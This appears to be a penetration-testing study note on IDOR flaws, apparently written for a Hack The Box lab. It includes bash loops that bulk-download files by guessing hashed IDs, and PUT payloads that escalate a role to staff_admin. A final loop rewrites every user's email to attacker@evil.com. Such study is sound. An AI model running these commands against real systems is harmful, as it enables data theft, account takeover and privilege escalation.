# IMPORTANT TLDR 
### CHECK COMBINATIONS OF ENCODED FIELDS FOR BASE64, MD5, URL AND SIMILAR ENCODING
### APIs API-ENDPOINTS ARE PARTICULARLY VULNERABLE. ALSO CHECK OUT [[ðŸ”µ 7. HTTP Verb Tampering]] AS ITS KINDA RELATED
# 1. What is IDOR?

IDOR occurs when an application uses user-supplied input to access objects (e.g., files, user profiles, database records) without proper access control validation.

Examples:

- `GET /download.php?file=1.pdf` â†’ Attacker changes it to `file=2.pdf` to download another userâ€™s file.    
- `GET /profile/1` â†’ Accesses user 1's profile, attacker tries `/profile/2` to read someone else's profile.

# 2. Types of IDOR

**2.1 IDOR for Information Disclosure**

- Unauthorized read access to resources (files, personal data, etc.)    
- Exploited using predictable or leaked object references

**2.2 IDOR for Insecure Function Calls**

- Unauthorized execution of actions on behalf of another user    
- Exploiting APIs (PUT/POST/DELETE) to modify or delete resources
# 3. Common Exploitation Patterns

#### a. Cleartext Identifiers (Simple IDOR)

- Direct manipulation of UID in URL or request body    
- Easy to enumerate (e.g., `/user?id=1`, `/profile/2`)
#### b. Encoded References (Obfuscated but Reversible)

- Application uses MD5 hashes or base64 to obscure object references    
- Still vulnerable if encoding mechanism can be reversed (e.g., `md5(base64(uid))`)

Example:

```bash
echo -n 1 | base64 -w 0 | md5sum | tr -d ' -'
```

Use the resulting hash in the request to access another object
#### c. SPA-based Frontend Exposure

- Applications using React/Vue/Angular may calculate identifiers client-side    
- JS reveals functions like `CryptoJS.MD5(btoa(uid))`
- Use browser DevTools â†’ Sources tab â†’ search `download(` or `fetch(`
#### d. Chained IDOR

- Combine Information Disclosure (GET uid/uuid) with Function Call (PUT request)    
- First, GET another userâ€™s data to leak UUID
- Then, send PUT with modified fields and correct UUID to overwrite their data
# 4. Practical Exploitation Workflow
#### Step 1: Identify Object References

- Intercept traffic with Burp    
- Locate GET/PUT/POST/DELETE calls referencing `uid`, `id`, `file`, `contract`, etc.
#### Step 2: Test for Authorization Controls

- Try changing the object reference (e.g., `uid=2` instead of `1`)
- Observe if data is leaked or errors occur
#### Step 3: Reverse Obfuscation if Needed

- Look for hashes like `cdd96d3cc73d1dbdaffa03cc6cd7339b`
- Try reversing using assumptions:
    - `md5(uid)`
    - `md5(base64(uid))`
#### Step 4: Enumerate in Bulk (Bash Script)

```bash
for i in {1..10}; do
  for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
    curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
  done
done
```

#### Step 5: Exploit Function Call IDOR

- Use leaked `uuid` from GET to perform PUT

```json
PUT /profile/api.php/profile/2
{
  "uid": "2",
  "uuid": "leaked_uuid",
  "role": "employee",
  "full_name": "Modified Name",
  "email": "attacker@htb.local",
  "about": "Owned"
}
```

#### Step 6: Attempt Privilege Escalation

- Modify `role` field (e.g., `role=staff_admin`) and submit PUT
- Confirm with GET whether role has changed
- If successful, try to perform restricted actions like creating or deleting users    
### 5. Case Study: Chaining IDOR Vulnerabilities

1. **GET** `/profile/api.php/profile/2` â†’ Leaks:

```json
{
  "uid": "2",
  "uuid": "4a9bd19b3b8676199592a346051f950c",
  "role": "employee"
}
```

2. **PUT** `/profile/api.php/profile/2` with modified role:

```json
{
  "uid": "2",
  "uuid": "4a9bd19b3b8676199592a346051f950c",
  "role": "staff_admin"
}
```

â†’ Role escalated without needing any data from existing admin user
### 6. Notes and Tips

- If role change works, manually update `Cookie: role=staff_admin` to enable UI changes
- Try known role names like: `admin`, `web_admin`, `staff_admin`, `srv_admin`
- Perform mass updates using loops if possible

Example:

```bash
for i in {1..10}; do
  curl -X PUT -H 'Content-Type: application/json' -d '{
    "uid":"'$i'",
    "uuid":"uuid_here",
    "email":"attacker@evil.com"
  }' http://SERVER_IP:PORT/profile/api.php/profile/$i

done
```
